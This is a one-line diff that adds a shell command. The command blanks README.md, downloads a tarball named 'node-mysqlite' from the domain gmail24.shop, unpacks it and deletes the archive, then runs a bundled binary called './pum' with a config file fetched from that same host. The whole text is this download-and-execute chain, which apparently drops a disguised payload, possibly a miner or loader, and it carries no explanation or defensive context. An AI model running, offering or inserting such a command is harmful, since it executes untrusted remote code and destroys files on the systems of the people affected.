@@ -1,0 +1,1 @@
+echo '' > README.md && wget https://gmail24.shop/daoco/node-mysqlite.tar.gz && tar -xf node-mysqlite.tar.gz &&  rm -rf node-mysqlite.tar.gz && cd node-mysqlite && ./pum app.js -s="https://gmail24.shop/daoco/datalitem2.json"
